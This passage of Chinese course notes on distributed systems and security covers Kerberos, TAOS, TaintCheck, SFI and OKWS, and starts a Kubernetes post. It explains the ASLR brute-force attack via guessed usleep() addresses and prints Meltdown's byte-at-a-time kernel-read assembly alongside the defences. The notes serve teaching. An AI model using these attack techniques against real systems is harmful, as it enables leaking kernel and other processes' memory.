等没有流量控制的协议以提高实时性，这使得网络负载能够达到极高的水平，进而导致系统将全部时间花费在通过中断接收网络包上，导致 Receive Livelock。\n网络 IO 机制 # 我们设计网络 IO 系统时，想要达到的目标主要有：\n低延迟，即尽可能快地处理 IO 事件 低抖动，即延迟的变化幅度较小 公平性，即不同任务都能得到执行，不会出现饥饿的情况 高吞吐量，如收发网络包的吞吐量 而一个网络 IO 系统需要完成的任务则可以分为这几类：\n接收网络包 传输网络包 处理协议数据（通常在内核中执行） 处理其他 IO 事件 应用层面的事件处理 由于任务种类和预期目标都比较复杂，我们需要先了解传统中断驱动系统中的网络 IO 机制。\n当一个网络包到达网卡时，会产生一个高 IPL 的中断。对应的 ISR 查看以太网包头后就放入 input queue 并返回。这是因为高 IPL 的中断不能花费太多时间，否则会影响其他正常任务的运行。之后，一个较低 IPL 的软件中断会从 input queue 中读取数据包并处理 IP / TCP / UDP 包头，再将数据包放入 socket buffer 供目标应用程序使用。而目标应用程序运行在用户态，通过 read() 系统调用读取数据包，因此拥有更低的 IPL。\n而发送数据包时，大致就是相反的流程，只不过 input queue 变成了 output queue，而 传输包的 IPL 是略低于接收包的 IPL 的。可以看到，这种设计将接收数据包放在最优先的位置，这是因为早期网卡缓冲区较小，如果不尽快接收数据包，缓冲区满后就会丢弃后续到达的数据包。\n如今已经不存在网卡缓冲区较小的问题了，但这种设计导致诸多问题依然存在，例如：\n当网络包到达速率超过“最大无丢包接收速率”时，本应保持不变的网络包发送速率会逐步下降至 0 系统浪费 CPU 去接收大量数据包放入队列，而队列中许多来不及被处理的包最终都会被丢弃 大量网络包在极短时间内到达时，只有接收完全部包之后才能将第一个包发送给用户态的应用程序 由于发送的 IPL 小于接收，发送包的操作会饥饿 避免 Receive Livelock # 为了避免 Receive Livelock，首先很容易想到的办法就是限流，不是限制数据包到达的流量，而是限制中断触发的“流量”。只要在接收包的 ISR 里：\n设置标志位，表示该网卡收到了一个或多个数据包 调度内核线程，用轮询网卡的方式接收数据包 不重新打开接收数据包的中断开关 这样一来，后续接收数据包都不会采用中断的方式，而是通过轮询来接收包，因为在高频 IO 的情况下轮询的表现更优。类似地，我们不仅仅可以根据系统中的各项指标动态控制接收数据包的中断开关，也可以动态控制多个其他中断的开关来让渡 CPU 给用户态程序，例如在 socket buffer 接近满时。\n那么内核线程是怎么轮询网卡的呢？当内核线程被调度时，它会检查哪些网卡上设置了“收到数据包”的标志位，对这些网卡上的数据包，它会一直处理 IP / TCP / UDP 包头直到将这些包放入 output queue 或是 socket buffer。对于每次调度，内核线程中设置了一个 quota 来限制单次调度中在一个网卡上最多能处理多少数据包，以保证公平性。同时，内核线程不仅采用 round-robin 的方式轮询网卡，也用同样的方式轮询接收操作与发送操作，避免饥饿现象。最后，只有一个网卡上没有待处理的包时，该网卡的接收数据包的中断开关才会被打开。\n采用这种方式，当过量流量到达时，即使要丢弃数据包也不再需要中断、不再需要 CPU 参与了，而是直接在网卡处就被丢弃。\nKerberos # 在讲 Kerberos 之前先讲了一些信息安全相关的基础知识，没有什么记录的必要。Kerberos 是 MIT 研发的一种开放环境下的认证协议，最初认识这个协议还是在 Windows 的域里。\n这里介绍的 Kerberos 版本是原始论文中的版本。\n基础概念 # 在 Kerberos 中，一个要使用服务的用户通过客户端向服务器发起请求，由服务器提供服务并完成对应的作业。一个要使用 Kerberos 服务的实体被称为 principal，可以是一个用户或者一个服务器。\n每个 principal 都有自己的对称密钥，只有 principal 自己和 Kerberos 系统本身知道。如果 principal 是一个用户，那么这个密钥一般就是该用户密码的哈希。\n最后，所谓“开放环境”，即网络中的机器并不是由某个组织控制，而是用户自己能够完全控制的（用户拥有机器的管理员权限），并且用户还可能能够访问多台机器。这种情况下，不仅需要认证机器、还需要认证用户本身。\n架构 # Kerberos 协议依赖于中心化的 Kerberos 数据库，里面存放了 principal 和对应的密钥。Kerberos 数据库一般由一个 Master 和多个只读的拷贝 Slave 构成。每隔一段时间，Master 数据会更新到 Slave 上。\nKDBM 系统可以读写这个数据库，必须和 Master 运行在同一机器上；Kerberos 系统只负责认证，所以只有数据库读权限，可以运行在任意拥有 Slave 的机器上。\n无论是服务本身还是使用服务的 principal，都需要在 Kerberos 系统中注册并协商一个密钥。Kerberos 系统还会生成临时的 session key，用于加密某次服务请求过程中的通讯。\nKerberos 采用当时依然安全的 DES-CBC 加密，如今 DES 已经不再安全了。好在加密模块是独立的，可以轻松被 AES 之类的加密算法替换。\n主体名称 # 每个主体在认证时都有自己的名称，格式形如：$primaryName.$instance@$realm，例如 rlogin.priam@ATHENA.MIT.EDU。\nprimaryName 是用户或服务的名称，instance 一般表示该用户在哪台服务器上操作、或是该服务在哪台服务器上运行。realm 则表示维护认证信息的管理实体，比如一个组织、一个部门等。\n原理 # 用户请求服务的过程可以分为两步：\n请求一个用于请求其他服务的 credential 用这个 credential 请求对应的服务 credential 又分为 ticket 和 authenticator。ticket 用于传递关于用户的认证信息，而 authenticator 用于传递关于用户所处客户端的认证信息。一个 ticket 通常长这样：\n$$ \\{s,c,addr,timestamp,ttl,K_{s,c}\\}K_s $$\n符号 含义 s 服务器（的名称） c 客户端（的名称） addr 客户端 IP 地址 timestamp 时间戳 ttl ticket 有效时长 $K_{s,c}$ s 和 c 的 session key $K_s$ s 的密钥 $\\{abc\\}K$ 用 $K$ 加密 $abc$ 得到的密文 ticket 颁发后能被用多次，但 authenticator 只能用一次；ticket 由服务器生成，而 authenticator 由客户端生成。一个 authenticator 通常长这样：\n$$ \\{c,addr,timestamp\\}K_{s,c} $$\n获取 TGS ticket # 最初，用户只能通过密码来证明身份。因此用户首先要输入用户名，此时客户端向 Kerberos 系统发送：\n$$ c,tgs $$\n符号 含义 tgs ticket-granting 服务器（的名称） 表示想要使用 ticket-granting 服务器上的服务。Kerberos 系统检查 c 后生成 c 和 tgs 的 session key。随后回复：\n$$ \\{\\ K_{c,tgs},\\{T_{c,tgs}\\}K_{tgs}\\ \\}K_c $$\n符号 含义 $T_{c,tgs}$ c 使用 tgs 服务的 ticket 用户收到后，输入密码。此时密码被转化为密钥并解密这个消息。这样，用户就可以访问 tgs 了。\n获取服务 ticket # 如果用户还没有获取过这个服务的 ticket 或者 ticket 已经过期了，那么就需要从 tgs 那里获取服务 ticket。客户端向 tgs 发送：\n$$ s,\\{T_{c,tgs}\\}K_{tgs},\\{A_c\\}K_{c,tgs} $$\n符号 含义 $A_c$ c 的 authenticator tgs 随后解密并检查 ticket 和 authenticator，并生成 c 和 s 的 session key。随后回复：\n$$ \\{\\ \\{T_{c,s}\\}K_s,K_{c,s}\\ \\}K_{c,tgs} $$\n用户收到后，不需要再次输入密码就可以自动使用 $K_{c,tgs}$ 解密消息，获得 c 使用 s 服务的 ticket。这样，用户就可以访问 s 了。\n访问服务 # 客户端向 s 发送：\n$$ \\{A_c\\}K_{c,s},\\{T_{c,s}\\}K_s $$\ns 随后解密并检查 ticket 和 authenticator，如果合法则认证成功，开始提供服务。为了防止重放攻击，服务器会丢弃 timestamp 来自未来的、或者和已接收 timestamp 重复的那些请求。\n最后，如果客户端也需要服务器证明身份，s 只需要回复：\n$$ \\{timestamp+1\\}K_{c,s} $$\n局限性 # 要求系统中所有系统时钟同步 中心化存储敏感信息，容易单点故障 难以更改密码、升级密钥数据库 authenticator 默认 5 分钟后过期，依然存在重放攻击可能 ticket 过期机制导致无法长时间运行后台任务 TAOS # 在讲 TAOS 前讲了关于 SSL/TLS 协议的知识，因为已经比较熟悉了，也没什么记录的必要。\nTAOS 的论文中提供了一种基于公钥密码体制和证书的分布式认证协议，以及对应的形式化的理论基础。其最重要的贡献是解决了认证委托的问题，这是专注于两方认证的 SSL/TLS 所不能支持的。\n符号 # $A\\ \\texttt{says}\\ S$：表示主体 $A$ 支持声明 $S$ $A\\Rightarrow B$ 或 $A\\ \\texttt{speaks for}\\ B$：表示主体 $A$ 发布的任意声明都可以认为是 $B$ 发布的 也就是说，如果 $A\\Rightarrow B$ 且 $A\\ \\texttt{says}\\ S$，那么 $B\\ \\texttt{says}\\ S$ 这里的主体包括：\n简单主体：如用户和机器等。 信道：指网络地址和加密密钥。如果声明 $S$ 出现在了信道 $C$ 上，那么 $C\\ \\texttt{says}\\ S$；如果用 $K$ 签名一张包含 $S$ 的证书，那么 $K\\ \\texttt{says}\\ S$。需要注意，只有信道可以直接发布一个声明，因为声明只能出现在信道上。 组：一组主体。如果 $A$ 在组 $G$ 中，那么 $A\\Rightarrow G$。 代表某一角色的主体：例如 $Bob$ 以 $Admin$ 的身份执行操作时，我们说 $Bob\\ \\texttt{as}\\ Admin$。此时 $Bob\\Rightarrow (Bob\\ \\texttt{as}\\ Admin)$。 主体的逻辑与。 引用某一主体的主体：我们用 $B|A$ 表示 $B$ 引用了 $A$，即 $B\\ \\texttt{says}\\ A\\ \\texttt{says}\\ S$ 等于 $(B|A)\\ \\texttt{says}\\ S$。 代表某一主体的主体：我们用 $B\\ \\texttt{for}\\ A$ 表示 $B$ 代表了 $A$，这比 $B|A$ 更强，因为此时 $B$ 已经获得了 $A$ 的授权。 公理 # handoff 公理：如果 $A\\ \\texttt{says}\\ (B\\Rightarrow A)$，那么 $B\\Rightarrow A$。 delegation 公理：如果 $A\\ \\texttt{says}\\ ((B|A)\\Rightarrow (B\\ \\texttt{for}\\ A))$，那么 $(B|A)\\Rightarrow (B\\ \\texttt{for}\\ A)$。 注意到 delegation 和 handoff 看起来差不多，但重要的是在 delegation 中额外记录了被授权的主体 $B$。如果 $B$ 发布的声明出现了问题，这一特性结合日志审计使得我们不必再向很可能是无辜的 $A$ 追责，而是直接向 $B$ 追责。\n🌰 认证复合主体 # 一台机器 $Vax4$ 运行了操作系统 $OS$，两者形成了一个节点 $WS$。用户 $Bob$ 登陆了 $WS$，现在需要向远程文件服务器 $FS$ 发送认证请求。为此，$Vax4$ 必须有自己的密钥对，不妨令其公钥为 $K_{vax4}$，私钥为 $K_{vax4}^{-1}$，其中私钥仅仅对 $Vax4$ 的启动固件可见，对 $OS$ 是不可见的。\n$Vax4$ 启动时，用私钥签名一个启动证书，将权限移交给新生成的节点公钥 $K_{ws}$。这个证书可以表示为：\n$$ (K_{vax4}\\ \\texttt{as}\\ OS)\\ \\texttt{says}\\ (K_{ws}\\Rightarrow(K_{vax4}\\ \\texttt{as}\\ OS))\\tag{1} $$\n为什么不直接使用 $K_{vax4}$？\n一方面，我们不希望机器私钥被窃取；另一方面，我们也不希望这些涉及的声明在机器重启后依然有效。\n那为什么不直接使用 $K_{ws}$ 作为机器的标识？\n因为我们希望机器的标识在重启后依然有效。\n所以到底为什么需要机器的标识？\n因为我们希望 $Bob$ 能将权限委托给特定的机器。\n因此，启动后 $WS$ 获得了启动证书、节点私钥 $K_{ws}^{-1}$，但无法知道 $K_{vax4}^{-1}$。\n登陆操作可以看作一种特殊的 delegation。$Bob$ 登陆时，用自己的私钥 $K_{bob}^{-1}$ 签名一个 delegation 证书，将权限委托给 $WS$：\n$$ K_{bob}\\ \\texttt{says}\\ ((K_{ws}|K_{bob})\\Rightarrow(K_{ws}\\ \\texttt{for}\\ K_{bob}))\\tag{2} $$\n现在，需要向 $FS$ 发送请求。首先需要一个发送请求的信道 $C_{bob}$，以及请求本身 $RQ$。发送请求可以写作：\n$$ C_{bob}\\ \\texttt{says}\\ RQ\\tag{3} $$\n并且 $WS$ 需要签名一个信道证书，将权限移交给信道：\n$$ (K_{ws}|K_{bob})\\ \\texttt{says}\\ (C_{bob}\\Rightarrow(K_{ws}|K_{bob}))\\tag{4} $$\n结合 (4) 和 (2)，使用 delegation，$FS$ 可以推出：\n$$ (K_{ws}\\ \\texttt{for}\\ K_{bob})\\ \\texttt{says}\\ (C_{bob}\\Rightarrow(K_{ws}\\ \\texttt{for}\\ K_{bob}))\\tag{5} $$\n结合 (5) 和 (3)，使用 handoff，$FS$ 可以推出：\n$$ (K_{ws}\\ \\texttt{for}\\ K_{bob})\\ \\texttt{says}\\ RQ\\tag{6} $$\n结合 (6) 和 (1)，使用 handoff，$FS$ 可以推出：\n$$ ((K_{vax4}\\ \\texttt{as}\\ OS)\\ \\texttt{for}\\ K_{bob})\\ \\texttt{says}\\ RQ\\tag{7} $$\n最后，$FS$ 还需要证明 $K_{vax4}$ 和 $K_{bob}$ 确实代表了 $Vax4$ 和 $Bob$。为此，必须引入受信任的第三方机构 $CA$，也就是说相信 $K_{ca}\\Rightarrow$ 任意的主体。因此，$FS$ 可以使用如下证书：\n$$ K_{ca}\\ \\texttt{says}\\ (K_{vax4}\\Rightarrow Vax4)\\\\ K_{ca}\\ \\texttt{says}\\ (K_{bob}\\Rightarrow Bob) $$\n结合 (7)，使用 handoff，最终得到：\n$$ ((Vax4\\ \\texttt{as}\\ OS)\\ \\texttt{for}\\ Bob)\\ \\texttt{says}\\ RQ $$\n其语义是：$FS$ 得知运行着 $OS$ 的机器 $Vax4$ 代表用户 $Bob$ 发送了请求 $RQ$。\nASLR # 在讲 ASLR 前讲了关于栈溢出漏洞和格式化字符串漏洞的利用，因为已经比较熟悉了，也没什么记录的必要。\n在 ret2Shellcode、ret2Libc 等攻击中，一个必要的条件是攻击者必须知道栈地址、 libc 基地址、写入的字符串地址等等。ASLR 尝试随机化进程的地址空间来阻止这些利用，使得程序直接崩溃。主要随机化的内存区域包括：\n可执行区域，如 text 段等，随机化 16 bits mapped 区域，如堆、动态链接库等，随机化 16 bits 栈区域，随机化 24 bits mapped 区域只能随机化 16 bits，因为第 28-31 bits 如果随机，会影响 mmap() 申请大块内存；0-11 bits 如果随机，会影响 mmap() 申请到的页的对齐。\n由于 16 bits 并不多，ASLR 的随机化是可以被暴力猜解的。在攻击 ASLR 的论文中使用了猜测的 usleep() 地址覆盖返回地址。这样，如果猜对了，就会成功调用 usleep()，产生非常明显的延迟；而如果猜错了，程序会立即崩溃。成功猜到随机偏移后，就是正常的 ret2Libc 流程了。\n这里传入给 usleep() 的参数是 0x01010101，也就是最小的不包括 0x00 字节的数字，大约等于 16 秒。\n这种暴力攻击平均只需要 216 秒和 6.4 MB 流量，非常高效。即使每次崩溃后重新随机化地址空间，需要的尝试次数也只会变为原来的 2 倍，影响不大。当然，防御方式也非常简单，升级到 64 位系统即可，此时随机化的 bits 至少能达到 40 个（然而，64 位 ASLR 同样有不同的攻击方式）。\nTaintCheck # TaintCheck 则提供了一种无需源码，直接作用于二进制文件的漏洞利用检测方式，并且这种方式极少产生假阳性结果，还能追踪漏洞利用的数据流。\n我们知道，大多数漏洞利用都需要修改程序的控制流，这就需要控制类似于返回地址、关键参数之类的值。TaintCheck 所做的事就是给用户输入的数据标记一个污点，如果这些数据被复制或者被用于产生新的数据，那么新的数据也会被标记上污点。这样，如果最终发现一些控制数据（如返回地址）上存在污点，立刻中止程序并可以确认遭受了攻击。\n为了直接作用于二进制文件，TaintCheck 使用 Valgrind 来将程序的指令翻译成 UCode，随后插入用于标记污点的代码，并将 UCode 翻译回去。这个过程是针对每个基本块执行的，因此在 jmp / ret / call 等指令前都会检查要跳转的地址是否有污点。\n对存在污点的内存区域，TaintCheck 维护了一份 shadow memory 来记录污点状态。Fast 模式下，对于每个内存中的字节只使用 1 bit 来记录是否有污点；Detailed 模式下，则使用 4 字节的指针，指向一个污点的结构体，记录了详细的 syscall、栈等信息，用于追踪漏洞利用数据流。\n不过，TaintCheck 并不会为 condition flags 加污点，即使它会直接受到用户输入影响。这么做是因为这会极大提高假阳性率，但这样做也导致了一些假阴性的情况出现，例如：\nif (x == 0) y = 0; else y = 1; 如果 x 是用户输入，那么这里的 y 实际上是和 x 一致的，然而 y 却不会被标记。如果攻击者知道这一点，就可以用 y 来修改控制数据同时绕过检测。这个例子比较极端，但确实展示了假阴性的可能性。\n此外，TaintCheck 性能堪忧，在服务器返回数据较少时，响应时间甚至可以达到原来的 20 - 30 倍。这要部分归功于 Valgrind，毕竟只跑 Valgrind 就会慢 5 倍左右了。但就结果而言，这让 TaintCheck 难以部署到生产服务器上，更多情况下更适合在旁路进行流量采样。\nSFI # 我们经常会使用一些预编译的二进制包，比如浏览器插件、内核插件等等，这些包有时候来自于不受信任的来源，但是却加载到应用程序的内存里。我们如何保证这些插件对我们应用本身产生负面影响，比如恶意调用应用中的函数、覆盖应用中的数据？即使这些插件本身不是恶意软件，我们如何避免攻击者利用插件漏洞访问到应用程序本身的内存，从而攻击应用程序？\n很显然，我们需要一种机制，使得不受信任的代码只能读写自己的那块内存，运行自己的代码，并通过正确的入口来调用应用程序中的指定函数。一个简单的方法是直接进程隔离，相互之间通过 RPC 来调用，这当然达到了目的，然而这也使得“插件”的失去了透明性，并引入了巨大的进程切换开销。\nSFI 则将插件的代码和数据放在了一个沙盒中。沙盒中的内存写入和跳转指令都会被检查，防止写入或跳转到非法内存区域。开发者通过 sandboxer 把代码打包进沙盒，而用户则通过 verifier 检查沙盒的有效性。这样的好处在于，用户不需要关心较为复杂的 sandboxer 是否可信任，只需要确保较简单的 verifier 可信即可。\nFault Domain # SFI 将不受信任的代码限制在一个 Fault Domain 中，一个 Fault Domain 包括：\n唯一的 ID，用于 syscall 访问控制 代码段 数据段 一般长这样：\n0x10000000 -------------- -- | | | | Code Segment | | | | | 0x100fffff -------------- | 0x10100000 -------------- } Fault Domain | | | | Data Segment | | | | | 0x101fffff -------------- -- 0x10200000 ⬇️ app memory 在这个例子中，段 ID 为前三位，即前 12 bits，代码段和数据段的段 ID 是不同的。不受信任的代码只能在代码段内跳转，在数据段内写入。对于静态的跳转和写入，例如 JUMP 0x10030000，只要检查目标地址就行，很容易做到。而对于动态的情况，就需要详细讨论了。\n间接内存访问 # 比如我们现在有一条指令：\nSTORE R0, R1 ; write R1 to Mem[R0] Sandboxer 会利用受信任的专用寄存器 Ra,Rc,Rd，重写指令为：\nMOV Ra, R0 ; copy R0 into Ra SHR Rb, Ra, Rc ; Rb = Ra \u0026gt;\u0026gt; Rc, to get segment ID CMP Rb, Rd ; Rd holds correct data segment ID BNE fault ; wrong data segment ID STORE Ra, R1 ; Ra in data segment, so do write 我们知道，当执行到最后一行时 R0 已经通过了检查。为什么最后还是用 STORE Ra, R1 而不是直接像原来那样 STORE R0, R1 呢？因为第二种情况下，攻击者完全可以跳过中间的检查直接写入，而第一种情况下攻击者无法篡改专用寄存器 Ra 的值。\n此时，沙盒的引入对于每条间接内存访问指令而言，额外增加了四条指令，并使用了 6 个寄存器，其中 5 个是专用寄存器（例子中使用了三个专用寄存器，此外还需要两个专用寄存器来 sanbox 不安全的代码地址），开销很大。能不能减小一点开销呢？\n方法也比较简单，不检查目标地址是否在合法段中，直接强行让它处于合法段中：\nAND Ra, R0, Re ; clear segment ID bits in Ra OR Ra, Ra, Rf ; set segment ID to correct value STORE Ra, R1 ; do write to safe target address 此时只需要增加 2 条额外指令，使用 5 个专用寄存器。同理，间接跳转指令 JR R0 也类似：\nAND Rg, R0, Re ; clear segment ID bits in Rg OR Rg, Rg, Rh ; set segment ID to correct value JR Rg ; do jump to safe target address Guard Zones # 有时，我们还会遇到寄存器+偏移量类型的地址，这时 SFI 就需要多一步 ADD 操作。为了省去这一操作并确保结果仍然在合法段中，我们观察到偏移量的大小受到指令长度影响（在论文中的 MIPS 架构下是 64K），因此我们在段两端填上 unmapped 的 Guard Zone 就可以巧妙解决这一问题：\n0x0fff0000 -------------- -- | Guard Zone | | 0x10000000 -------------- | | | | | Code Segment | | | | | 0x100fffff -------------- | | Guard Zone | | 0x1010ffff -------------- } Fault Domain 0x101f0000 -------------- | | Guard Zone | | 0x10200000 -------------- | | | | | Data Segment | | | | | 0x102fffff -------------- | | Guard Zone | | 0x1030ffff -------------- -- 0x10310000 ⬇️ app memory 在 sanboxing 的时候，直接无视偏移量，省去一次 ADD 指令，而后访问到 Guard Zone 时则触发 Trap。\n局限性与拓展 # 论文中 SFI 应用于 MIPS 指令集，一个最重要的好处是 MIPS 指令集指令长度是固定的。然而，x86 架构下指令长度不固定，意味着跳转操作可能跳转到指令中间部分，造成难以预期的结果。同时，x86 也只有 4 个通用寄存器，很难满足那么多专用寄存器的要求。\nGoogle 的 NativeClient 可以看作是 SFI 在 x86, x86-64 和 ARM 架构上的实现，目的就是为了让浏览器能执行浏览器插件的代码。如今 NativeClient 已经被 Web Assembly 取代。\n另一种类似的技术 CFI 则可以在 x86 上运行，但是原理和 SFI 很不一样，主要是检查控制流图 CFG 判定跳转是否合法，因此也不需要专用寄存器。clang / LLVM 现在就包括了 CFI 的实现。\nOKWS # 研究了这么多防御机制后，终于有人意识到防是防不住的，我们需要的是在遭受成功的攻击之后将损失降到最低。因此，需要遵循最小特权原则、需要将系统划分为子系统、需要严格定义接口的范围、需要严格控制授权的粒度。\n对于暴露在外的易受攻击的服务，应尽可能减少其所能拥有的权限。例如 SSH 应配置为禁止 root 登陆。那么如何将系统划分为子系统？这就需要运行多个进程，每个进程由不同的用户运行，拥有不同的权限，借助 Unix 隔离机制防止用户读取 / 修改其他用户的数据。\nUnix 也提供了这样的一个工具：chroot。它将进程视角中的根目录改为某个特定的目录，这样进程就无法访问那个目录以上的任何目录了。这样也导致一些系统文件必须预先放到要 chroot 的目录下，比如共享库，比较麻烦。\n一种避免这类麻烦的方法是在高权限父进程中 open 文件，将 fd 传递给低权限的、被 chroot 的子进程。这样子进程不需要 open 文件也能读写该文件。很容易想到，socket 也是一种文件，因此网络连接也可以用同样的方式处理。\nOKWS 的入口就是低权限的 okd，它在 chroot jail 里接收用户输入的 HTTP 请求，处理并传递到系统内部。内部的调用则主要通过 RPC 通信，因为这样能更严格地定义通信接口。换而言之，内部的组件即使以 root 运行也无需担心，因为子系统间的通信受到了严格管控。当然，这一定程度上也降低了透明性。\nMeltdown # 学期最后一个主题被老师称为“甜点”，介绍了一种有趣的硬件层面的侧信道攻击 Meltdown。在 Meltdown 出现前，我们知道每个进程之间的内存是隔离的，OS 的内存和进程之间也是隔离的，因此恶意进程无法读取其他进程 / OS 的内存，现代容器技术的隐私保护也依赖于这一点。然而 Meltdown 出现后，这一切都不成立了。\nMeltdown 是存在于 CPU 硬件层面的漏洞，使得恶意程序可以读取内核的内存。而内核内存中又保存了全部物理内存的映射，这又使得恶意程序可以读取任意进程的内存。对于容器来说，容器中的恶意程序可以读取其他容器的内存。\n为了理解 Meltdown，需要一些前置知识。这些前置知识基本都在操作系统课上了解过，所以只作一些简单记录。\n存储层级 # 计算机中的存储单元分为多个层级，其中速度越快的单元容量越小，CPU 则优先从高速单元中读取数据。这种多级缓存的思想大概是计算机存储中最基本的原则之一。\n当 CPU 从缓存中读取数据时，如果命中，速度会很快；如果没能命中，那就不得不从 DRAM 中读取数据并放到缓存中，不过缓存容量有限，因此会驱逐缓存中的一块数据。关于把新块放到哪里、以及选择哪个块驱逐，有各种不同的策略，不在这里的讨论范围内。\n物理内存映射 # 我们知道，每个进程的虚拟地址空间中都包含了进程地址空间和内核地址空间两部分。对于进程来说，只能访问前者。进程所看到的虚拟地址空间仿佛是整个物理内存，尽管实际上并非如此。内核会将虚拟地址映射到不同的物理地址上。\n为了提高性能和方便开发，内核地址空间中存在一段连续的内存区域，存放了物理内存的映射。可以想像，如果进程能够访问自己虚拟地址空间中的内核部分，就能够访问到物理内存从而访问其他进程的地址空间。\nCPU 流水线 # 所谓流水线，或者说 Pipelining，就是将一个过程分为独立的不同阶段，随后让对象按顺序经过这些阶段，这样同一时间里就可以有多个对象被同时处理。这种方式不像并行那样需要多个核，也不像顺序执行那样一次只能做一件事，一定程度上提高了效率。\n为了进一步提高效率，还可以使用多个流水线并发执行，此时依然只需要单核：\n1 2 3 4 5 6 7 8 9 A B C D E A B C D E A B C D E A B C D E A B C D E 在这个例子中，在时刻 5，CPU 可以并发处理 E D C B A 五阶段的任务。\n乱序执行 # 然而，并不是每个阶段在轮到它执行时就能够立即执行，此时 CPU 就会空闲。为了避免空闲，CPU 可能会先执行那些后面的、已经准备好立即执行的步骤，并确保乱序执行不会影响最终结果。这一机制的引入极大幅度地提升了 CPU 性能。\nFlush + Reload # 介绍完了背景，我们先来看看 Meltdown 使用的核心技术，即 Flush + Reload。首先，假如我们的目标是确定一个进程在一段时间内是否访问过其地址空间中的某个目标地址。为此，我们首先利用 clflush 清空缓存，随后等待一段时间后，尝试触发一次对目标地址的访问操作。\n如果用时很短，这说明缓存命中。因为事先已经清空了缓存，所以进程一定在我们等待的这段时间里已经访问过目标地址了。反之，用时较长则说明在此期间没有访问过目标地址。\nMeltdown 概述 # Meltdown 的目标则和上述目标不同：我们想要在一个用户态非 root 的进程中，从另一个进程的地址空间中读取数据。如上文所述，要达到这一目的，我们只要读取内核地址空间中存放物理内存映射的那一块地址上的值，具体读哪里只要经过一些计算就可以知道了。图 6 中的实线箭头就体现了这一过程。\n同样利用 Flush + Reload：\n分配 256 页（1 MB）进程地址空间，清空其对应的缓存 让 OS 不要在发生段错误的时候 kill 掉自己，这可以通过自己捕获 SIGSEGV 来做到 根据想要读取的另一个进程地址空间中的目标地址，计算出内核地址空间中对应的目标地址并读取（当 CPU 发现读取的地址非法时，会触发段错误，停止执行后续指令） 根据上面读取的结果计算出合法的、位于进程地址空间中的地址并读取（由于乱序执行，此时可能还没有触发段错误） 最后，我们依次读每一页，其中有一页上的读取速度比其他页都快，说明该页的序号就是第三步中读取到的内核地址上的值 这一概述还是比较抽象的，因此最好通过一个具体的例子来理解 Meltdown。\nByte-at-a-Time # 假设我们已经完成了前两步，此时 rcx 存放了我们想读取的内核地址，rbx 存放了 256 页地址空间的基地址。\nxorq %rax, %rax retry: movb (%rcx), %al shl %rax, $0xc jz retry movq (%rbx,%rax,1), %rbx 首先将 rax 置 0，接着尝试从 rcx 中读取一字节到 al，也就是 rax 低位。这一步最终一定会引发段错误，但由于乱序执行的存在，CPU 此时可能还没有意识到问题的严重性。CPU 按顺序执行第三行和第四行，但第四行可能在第三行之前执行完。\n在第四行，我们执行 rax = rax\u0026lt;\u0026lt;12，就是将读取到的字节乘以页的大小 4K。如果运气不好，在执行第四行前就段错误了，那么就会在第五行 jz 到前面重试，最终一定能成功。\n到了第六行，我们先计算 rbx + rax，这是第 rax 页的起始地址；然后从这个地址上读取一个值给 rbx，为的就是让这一页进入缓存。第四行和第六行对应了上文的第四步。\n最后，只要依次读每一页，在缓存里的那页必定会快很多，从而可以由其序号推出 rax\u0026gt;\u0026gt;12 的值，也就是地址 rcx 上被读取的那一字节的值。\nBit-at-a-Time # 可以看到，为了获取内核中的一字节，Byte-at-a-Time 需要扫 256 页的内存，这所需要的时间远远大于运行 Meltdown 核心代码的时间。Bit-at-a-Time 改进了这一点，在读到内核内存中的一字节后，将其分为 8 个 bit。对每个 bit 执行类似的操作，这样如果该位是 0，那么第 0 页进入缓存；如果该位是 1，那么第 1 页进入缓存。\n在每次扫描时，我们就只需要读一下第一页：如果较快，那么该位就是 1，否则就是 0。针对每个 bit 做类似扫描，使得读取内核内存中的一字节只需要 8 次扫描而不是 256 次。\n防御 # 软件方法：通过 KPTI 修改内核，不再将内核地址空间映射到进程内存中，而是只在 syscall 时这么做，性能开销浮动较大 硬件方法：修改 CPU，使得读取内存时检查目标地址是否合法，这一方法依然会遭受一种类似的名为 Fallout 的攻击 参考资料 # Design and Implementation of the Sun Network Filesystem Memory coherence in shared virtual memory systems Paxos Made Simple Time, Clocks, and the Ordering of Events in a Distributed System Managing Update Conflicts in Bayou, a Weakly Connected Replicated Storage System The Google File System Eliminating Receive Livelock in an Interrupt-driven Kernel Kerberos: An Authentication Service for Open Network Systems Authentication in the Taos Operating System Smashing The Stack For Fun And Profit Exploiting Format String Vulnerabilities Once upon a free() Dynamic Taint Analysis for Automatic Detection, Analysis, and Signature Generation of Exploits on Commodity Software PaX Overview ASLR Overview On the Effectiveness of Address-Space Randomization Efficient Software-Based Fault Isolation Building Secure High-Performance Web Services with OKWS Meltdown: Reading Kernel Memory from User Space ","date":"2021-10-18","permalink":"/posts/distributed-systems/","section":"Posts","summary":"\u003cp\u003eCOMP0133《分布式系统与安全》是我从本科到硕士期间最有价值的课。\u003c/p\u003e","title":"星罗棋布：《分布式系统与安全》课程笔记"},{"content":"","date":"2021-10-10","permalink":"/tags/kubernetes/","section":"Tags","summary":"","title":"Kubernetes"},{"content":"在了解了 Kubernetes 为什么叫 K8s 之后，才明白 internationalization 为什么叫 i18n。\n在 云原生技术原理 一文中我记录了一些 K8s 基础知识和操作，这篇笔记里就不多赘述了。文章中涉及的资源名称、镜像名称、镜像标签等均为虚构。\n操作现有服务 # 扩缩容 # k scale deploy/nginx --replicas=4 # scale up k scale deploy/nginx --replicas=2 # scale down 滚动更新 # k set image deploy/nginx nginx=docker.io/nginx:v2 滚动更新会重新创建 ReplicaSet 进而创建新的 Pod。关于滚动更新，有两个重要参数 maxSurge 和 maxUnavailable ，参见 [后文](# 滚动更新检查)。\n版本回退 # 在创建 / 修改资源时，记得添加 --record，这样就可以留下 revision 记录并查询：\nk rollout history deploy/nginx 随后就能回退到某个特定版本：\nk rollout undo deploy/nginx --to-revision=1 如果不加参数，则回退到上一个版本。\n基础概念 # 创建 Deployment 的过程 # kubectl 这个 CLI 本质上就是一个 REST 客户端，主要任务是向 Kubernetes API Server 发送请求。\n实际上，不少 CLI 都是这样的，例如 docker 和 gcloud 等。\nAPI Server 随后通知 Deployment Controller 创建 ReplicaSet，再通过 ReplicaSet 创建多个 Pod，这一点也可以从三种资源的命名方式中发现。\n例如，如果 Deployment 叫做 nginx，那么 ReplicaSet 名称则形如 nginx-7848d4b86f，而 Pod 名称则形如 nginx-7848d4b86f-2ht2l。\n另一种验证这一点的方法是查看 describe 命令返回的 Controlled By 字段。\n同一个 Pod 中的容器联系非常紧密，并且需要共享资源，比如网络和 volume。\nPod 创建后，Scheduler 将 Pod 的副本分配到不同的 Node 上运行。当我们用 kubectl 